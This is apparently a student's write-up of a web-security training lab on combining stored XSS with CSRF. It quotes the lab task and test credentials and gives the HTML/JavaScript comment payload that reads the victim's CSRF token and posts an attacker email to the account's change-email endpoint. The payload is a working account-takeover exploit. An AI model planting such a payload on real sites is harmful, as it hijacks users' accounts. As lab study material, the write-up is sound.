*This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.
You can log in to your own account using the following credentials: wiener:peter*

Submitted the following payload into the comment section to solve the lab:
```html 
<!-- onloading, this script will steal their token by searching for it. it will then create a form with the token and submit the parameters in the POST request to the target URL, that is to change email-->
    <body onload="stealToken()">
        <script>
            function stealToken(){
                var token = document.getElementsByName('csrf')[0].value;

                var data = new FormData;
                data.append('csrf',token);
                data.append('email','evilman@gmail.com');


                fetch('/my-account/change-email',{
                    method: "POST",
                    mode: "no-cors",
                    body: data
                });
            }
        </script>
    </body>
    
```
![[Screenshot 2024-05-17 at 7.10.25 PM.png]]
